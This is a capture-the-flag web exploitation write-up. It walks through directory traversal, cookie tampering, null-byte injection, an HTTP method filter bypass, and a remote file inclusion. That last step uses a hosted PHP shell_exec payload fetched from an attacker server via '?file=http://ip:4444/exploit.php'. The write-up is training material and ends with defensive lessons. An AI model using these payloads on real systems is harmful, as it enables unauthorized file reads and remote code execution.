## Web Challenge Writeup

Category: Web Exploitation  
Difficulty: Medium  
Techniques: Directory Traversal, Cookie Manipulation, Null-Byte Injection, Method Bypass, Remote File Inclusion  
Author: ctxzero

---

## üß† Overview  
This writeup details the analysis and successful exploitation of multiple web challenges. The goal was to extract secret flags by leveraging Directory Traversal, Cookie Manipulation, Null-Byte Injection, Method Bypass, and Remote File Inclusion vulnerabilities.

---

### Flag 1: Directory Traversal via POST Request

#### üöÄ Exploitation Steps

1. **Initial Testing**  
   Submitting input in the field yielded no visible response or error message. Noticed a `#` appended at the end of the URL.

2. **Source Code Insight**  
   The `#` symbol corresponds to a URL fragment in GET requests. A variable was found to be processed via GET method.

3. **Dev Tools Manipulation**  
   Changed HTTP method from GET to POST in browser dev tools. Submitted arbitrary input and observed error codes revealing the current path.

4. **Directory Traversal**  
   Using POST, submitted `../../../etc/flag1` as input. Successfully retrieved contents of `/etc/flag1`.

---

### Flag 2: Cookie Manipulation & Null-Byte Injection

#### üöÄ Exploitation Steps

1. **Access Restriction**  
   Page displayed "only admins allowed" ‚Äî guessed access control via cookies.

2. **Cookie Editing**  
   Changed cookie value from `guest` to `admin`. Gained access and observed the current path.

3. **File Preview Insight**  
   Page showed ‚ÄúFile Content Preview of admin Welcome admin‚Äù, indicating the cookie value is used as a filename.

4. **Filename Testing**  
   Set cookie to `ls`. Page showed ‚ÄúWelcome ls‚Äù but also ‚Äúno such file or directory‚Äù error, confirming file lookup in `/var/www/html/`.

5. **Directory Traversal Attempt**  
   Tried `../../../etc/flag2` but failed‚Äîlikely directory restricted.

6. **Null-Byte Injection Bypass**  
   Added null-byte `%00` (`../../../etc/flag2%00`). This truncated PHP‚Äôs automatic `.php` extension. After adjusting traversal depth (`../../../../etc/flag2%00`), successfully read Flag 2.

---

### Flag 3: Filtering & Method Bypass

#### üöÄ Exploitation Steps

1. **Error Observations**  
   Input caused errors indicating `.php` appended automatically.

2. **Filter Analysis**  
   Direct traversal attempts failed as `../` sequences were stripped. Only letters allowed; dots, slashes, and digits filtered.

3. **Method Change**  
   Switching from GET to POST bypassed filtering completely.

4. **Burp Suite Exploitation**  
   Crafted POST request with `../../../etc/flag3%00` via Burp Suite. Retrieved Flag 3 successfully.

---

### Remote File Inclusion (RFI) Exploit

#### üöÄ Exploitation Steps

1. **Parameter Enumeration**  
   Found a parameter vulnerable to file inclusion.

2. **Payload Creation**  
   Created `exploit.php`:
   ```php
   <?php
   $hostname = shell_exec('hostname');
   echo "Hostname: " . $hostname;
   ?>

3. **Hosting Payload**
  Started local HTTP server:
   python3 -m http.server 4444

4. **Triggering RFI**
  Accessed vulnerable URL with:
  ?file=http://ip:4444/exploit.php

5. **Result**
Remote server executed payload and displayed hostname ‚Äî achieving remote code execution.

---

### üèÅ Summary

Directory Traversal via insufficient POST input validation

Cookie manipulation combined with null-byte injection to bypass file extension restrictions

Filtering bypass through HTTP method change

Remote File Inclusion enabling execution of attacker-controlled code

---

## Lessons Learned:
Always validate inputs rigorously, enforce strict access controls, and never include files based on unsanitized user input.

---

### üìÅ Tags
#ctf #web #rce #directorytraversal #nullbyte #cookie #rfi #burpsuite #pentesting
